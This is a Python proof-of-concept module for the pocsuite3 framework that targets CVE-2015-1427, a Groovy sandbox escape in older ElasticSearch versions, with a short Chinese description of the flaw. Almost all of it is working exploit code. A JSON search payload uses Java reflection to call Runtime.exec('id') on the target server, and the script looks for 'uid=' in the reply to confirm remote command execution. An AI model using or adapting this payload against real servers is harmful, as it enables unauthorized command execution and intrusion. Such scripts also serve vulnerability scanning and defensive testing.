#!/usr/bin/python
# -*- coding: utf-8 -*-

'''  -u http://x.x.x.x:9200/  标准调用方法  '''

from pocsuite3.api import requests # 用法和 requests 完全相同
from pocsuite3.api import register_poc
from pocsuite3.api import Output, POCBase

headers = {'user-agent': 'Mozilla/5.0 (Windows NT 10.0; Win64; x64; rv:74.0) Gecko/20100101 Firefox/74.0', 'content-type': 'application/json'}

poc1 = {"name": "test"}
poc2 = {"size":1,"script_fields":{"test#":{"script":"java.lang.Math.class.forName(\"java.io.BufferedReader\").getConstructor(java.io.Reader.class).newInstance(java.lang.Math.class.forName(\"java.io.InputStreamReader\").getConstructor(java.io.InputStream.class).newInstance(java.lang.Math.class.forName(\"java.lang.Runtime\").getRuntime().exec(\"id\").getInputStream())).readLines()","lang":"groovy"}}}


def poc(url):
    res = requests.post(url + 'website/blog/', json=poc1, verify=False, timeout=10, headers=headers)
    res1 = requests.post(url + '_search?pretty', json=poc2, verify=False, timeout=10, headers=headers)

    if "blog" in res.text and "uid=" in res1.text:
        return True
    return False


class TestPOC(POCBase):
    name = 'liunx_cve-2015-1427'
    vulID = 'CVE-2015-1427'
    author = ['weihong','mfz']
    vulType = 'RCE'
    version = '1.1'  # default version: 1.0
    references = ['']
    desc = '''
            ElasticSearch是一个JAVA开发的搜索分析引擎。
            2014年，曾经被曝出过一个 远程代码执行漏洞（CVE-2014-3120） ，漏洞出现在脚本查询模块，由于搜索引擎支持使用脚本代码（MVEL），作为表达式进行数据操作，攻击者可以通过MVEL构造执行任意java代码，
            后来脚本语言引擎换成了Groovy，并且加入了沙盒进行控制，危险的代码会被拦截，结果这次由于沙盒限制的不严格，导致远程代码执行。
		   '''
    vulDate = '2015-03-14'
    createDate = '2020-03-20'
    updateDate = '2020-11-27'
    appName = 'Liunx ElasticSearch'
    appVersion = '1.4.2,1.4.1,1.4.0,1.3.7,1.3,6,1.3.5,1.3'
    appPowerLink = ''
    samples = ['']

    def _attack(self):
        '''attack mode'''
        return self._verify()

    def _verify(self):
        '''verify mode'''
        result = {}
        if poc(self.url):
            result['VerifyInfo'] = {}
            result['VerifyInfo']['IP'] = str(self.url)[7:] + ' Liunx_cve-2015-1427' + ' is exist!'
        return self.parse_output(result)

    def parse_output(self, result):
        output = Output(self)
        if result:
            output.success(result)
        else:
            output.fail('Internet nothing returned')
        return output

register_poc(TestPOC)
